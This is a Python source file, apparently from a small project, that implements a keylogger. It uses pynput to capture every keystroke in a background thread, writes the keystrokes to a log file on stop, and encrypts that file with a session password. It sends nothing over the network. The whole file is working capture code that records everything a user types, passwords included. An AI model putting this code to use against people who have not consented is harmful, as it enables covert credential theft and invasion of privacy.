### models/keylogger.py

from pynput import keyboard
from models.encryption import encrypt_file
import threading
session_password = None  # Will be set when keylogger starts


LOG_FILE = "log.txt"
ENCRYPTED_FILE = "encrypted_log.txt"

key_log = ""
listener = None


def on_press(key):
    global key_log
    try:
        key_log += key.char
    except AttributeError:
        key_log += f" [{key}] "


def start_logging(password):
    global listener, key_log, session_password
    session_password = password
    key_log = ""

    def run():
        global key_log
        with open(LOG_FILE, "w") as file:
            file.write("")
        with keyboard.Listener(on_press=on_press) as l:
            global listener
            listener = l
            print("[KEYLOGGER THREAD STARTED]")
            l.join()

    t = threading.Thread(target=run)
    t.start()


def stop_logging(password):
    global listener
    if listener is not None:
        listener.stop()
        listener = None
        with open(LOG_FILE, "a") as f:
            f.write(key_log)
        print("[KEYLOGGER STOPPED]")
        encrypt_file(LOG_FILE, ENCRYPTED_FILE, password)
        print("[ENCRYPTION DONE]")
        
def force_stop():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
        print("[KEYLOGGER FORCEFULLY STOPPED]")
        
